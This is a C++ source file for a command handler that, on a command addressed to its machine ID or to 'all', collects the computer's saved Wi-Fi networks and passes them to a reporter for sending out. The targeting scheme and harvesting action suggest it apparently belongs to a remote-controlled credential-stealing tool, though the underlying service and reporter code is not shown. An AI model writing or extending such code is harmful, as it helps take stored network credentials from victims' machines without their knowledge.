#include "application/commands/WifiHandler.hpp"

#include <algorithm>

namespace nuub::application::commands {

WifiHandler::WifiHandler(
    interfaces::IWifiService& wifi,
    interfaces::IReporter& reporter,
    std::string pc_id)
    : wifi_(wifi)
    , reporter_(reporter)
    , pc_id_(std::move(pc_id)) {}

bool WifiHandler::matches(const std::string& target) const {
    if (target.empty()) return true;
    std::string lower = target;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    std::string lower_pc = pc_id_;
    std::transform(lower_pc.begin(), lower_pc.end(), lower_pc.begin(), ::tolower);
    return lower == lower_pc || lower == "all";
}

domain::Result<void> WifiHandler::handle_wifi(const std::string& target) {
    if (!matches(target)) return domain::Result<void>::success();

    auto networks = wifi_.get_saved_networks();
    reporter_.send_message(networks);
    return domain::Result<void>::success();
}

} // namespace nuub::application::commands
